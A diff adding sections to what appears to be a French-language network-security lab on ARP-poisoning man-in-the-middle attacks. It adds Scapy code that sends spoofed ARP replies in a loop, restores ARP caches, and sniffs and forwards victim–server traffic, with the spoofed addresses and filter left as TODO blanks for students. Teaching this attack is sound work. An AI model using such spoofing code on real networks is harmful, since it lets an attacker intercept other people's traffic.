@@ -111,9 +111,64 @@ for _, response in answered:
 
 **Question** : À quoi sert cette fonction `resolve_mac()` et pourquoi est-elle essentielle pour l'attaque ?
 
+#### 3.2 : Empoisonnement ARP bidirectionnel (lignes 70-91)
 
+```python
+def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    """
+    ÉTAPE 2 : Empoisonnement ARP bidirectionnel.
 
-#### 3.2 : Interception et transfert des paquets (lignes 143-164)
+    Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur
+    nous croient à l'autre bout.
+
+    TODO : Compléter les trames ARP falsifiées avec les bonnes IP sources (psrc).
+    """
+    log("starting ARP poisoning loop")
+    # TODO: Compléter les champs psrc pour usurper les identités
+    frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
+        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SPOOFED_IP_FOR_VICTIM, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
+    )
+    frame_to_server = Ether(dst=server_mac, src=attacker_mac) / ARP(
+        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=SPOOFED_IP_FOR_SERVER, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
+    )
+    while not stop_event.is_set():
+        sendp(frame_to_victim, verbose=0, iface=INTERFACE)
+        sendp(frame_to_server, verbose=0, iface=INTERFACE)
+        time.sleep(POISON_INTERVAL)
+    log("ARP poisoning loop stopped")
+```
+
+#### 3.3 : Restauration des tables ARP légitimes (lignes 94-118)
+
+```python
+def restore_arp(victim_mac: str, server_mac: str) -> None:
+    """
+    ÉTAPE 3 : Restauration des tables ARP légitimes.
+
+    Réémet des annonces ARP légitimes pour rendre les caches cohérents avant de quitter.
+
+    TODO : Compléter les adresses MAC sources (src et hwsrc) avec les VRAIES MACs.
+    """
+    # TODO: Compléter avec les vraies MACs
+    sendp(
+        Ether(dst=victim_mac, src=REAL_SERVER_MAC)  # TODO: quelle MAC source ?
+        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=REAL_SERVER_MAC),  # TODO: quelle MAC ?
+        count=5,
+        inter=0.2,
+        verbose=0,
+        iface=INTERFACE,
+    )
+    sendp(
+        Ether(dst=server_mac, src=REAL_VICTIM_MAC)  # TODO: quelle MAC source ?
+        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=REAL_VICTIM_MAC),  # TODO: quelle MAC ?
+        count=5,
+        inter=0.2,
+        verbose=0,
+        iface=INTERFACE,
+    )
+```
+
+#### 3.4 : Interception et transfert des paquets (lignes 143-164)
 
 ```python
 # TODO: Compléter les conditions pour détecter la direction
@@ -129,6 +184,32 @@ new_packet = Ether(src=attacker_mac, dst=DST_MAC) / packet[IP]  # TODO: utiliser
 ```
 
 **Question** : Comment l'attaquant détermine-t-il si un paquet va de la victime vers le serveur ou l'inverse ? Pourquoi doit-il modifier l'en-tête Ethernet ?
+
+#### 3.5 : Capture des paquets Scapy
+
+```python
+def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    """
+    ÉTAPE 5 : Capture des paquets avec Scapy.
+
+    Démarre le sniffer Scapy et redirige chaque paquet vers le handler MITM.
+
+    TODO : Compléter le filtre BPF pour capturer uniquement le trafic victime↔serveur.
+    """
+    log("starting packet sniffer")
+
+    def handler(pkt):
+        forward_packet(pkt, victim_mac, server_mac, attacker_mac)
+
+    # TODO: Compléter le filtre pour capturer les paquets entre VICTIM_IP et SERVER_IP
+    sniff(
+        iface=INTERFACE,
+        prn=handler,
+        store=False,
+        stop_filter=lambda _: stop_event.is_set(),
+        filter=BPF_FILTER,  # TODO: "ip host ... and ip host ..."
+    )
+```
 
 ## Étape 4 : Observation de l'attaque
 
